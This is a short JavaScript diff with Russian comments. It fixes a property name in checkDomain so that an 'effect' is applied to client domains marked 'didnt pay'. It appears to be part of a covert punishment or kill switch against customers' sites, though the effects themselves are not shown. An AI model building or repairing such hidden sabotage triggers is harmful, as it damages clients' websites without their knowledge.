@@ -65,7 +65,7 @@ function checkDomain() {
         console.log("Наказаний не найдено. Заказчик чист.");
     } else {
         // Проверка, если case у домена равен "didnt pay"
-        if (siteInfo.case === "didnt pay") {
+        if (siteInfo.cause === "didnt pay") {
             // Применение эффекта, если домен найден в списке и case равен "didnt pay"
             const effectFunction = effects[siteInfo.effect];
             if (effectFunction) {
